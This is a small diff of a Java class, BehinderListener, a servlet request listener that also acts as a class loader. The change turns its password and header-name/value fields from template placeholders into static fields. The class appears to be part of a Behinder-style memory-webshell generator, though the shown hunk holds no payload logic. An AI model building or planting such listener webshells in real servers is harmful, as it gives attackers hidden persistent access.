@@ -16,9 +16,9 @@ import java.util.Map;
  * @since 2024/12/21
  */
 public class BehinderListener extends ClassLoader implements ServletRequestListener {
-    public String pass = "{{pass}}";
-    public String headerName = "{{headerName}}";
-    public String headerValue = "{{headerValue}}";
+    public static String pass;
+    public static String headerName;
+    public static String headerValue;
 
     public BehinderListener() {
     }
